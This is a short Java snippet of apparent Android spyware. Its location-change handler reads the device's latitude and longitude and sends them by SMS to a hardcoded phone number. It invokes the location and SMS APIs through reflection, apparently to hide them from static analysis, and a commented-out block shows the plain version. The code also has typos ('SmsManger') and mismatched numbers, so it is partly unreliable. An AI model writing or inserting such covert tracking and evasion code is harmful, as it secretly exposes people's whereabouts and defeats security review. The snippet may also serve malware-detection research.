
class Location {
    public void onLocationChanged(Location location) {

	/*
	SmsManger sms = SmsManager.getDefault();
	String loc = location.getLatitude() + "\n" + location.getLongitude();
	sms.sendTextMessage("+82100000000", null, loc, null, null);
	*/

	Double[] locArr = new Double[2];
	Method[] m      = new Method[4];
	SmsManger[] sms = new SmsManager[1];

	try {
	    Class locCls = Class.forName("android.location.Location");
	    
	    m[0] = locCls.getDeclaredMethod("getLatitude");
	    m[1] = locCls.getDeclaredMethod("getLongitude");
	    
	    locArr[0] = (Double) m[0].invoke(location);
	    locArr[1] = (Double) m[1].invoke(location);

	    String loc = locArr[0] + "\n" + locArr[1];
	    
	    Class smsCls = Class.forName("android.telephony.SmsManager");

	    m[2] = smsCls.getDeclaredMethod("getDefault");
	    sms[0] = (SmsManager) m[2].invoke(sms[0]);

	    Class[] parTypes = {String.class, String.class, String.class, 
				PendingIntent.class, PendingIntent.class};
	    m[3] = smsCls.getDeclaredMethod("sendTextMessage", parTypes);
	    Object[] par = { "+821000000000", null, loc, null, null };
	    m[3].invoke(sms[0], par);
	}
	catch (Throwable e) {
	    System.err.println(e);
	}
    }
}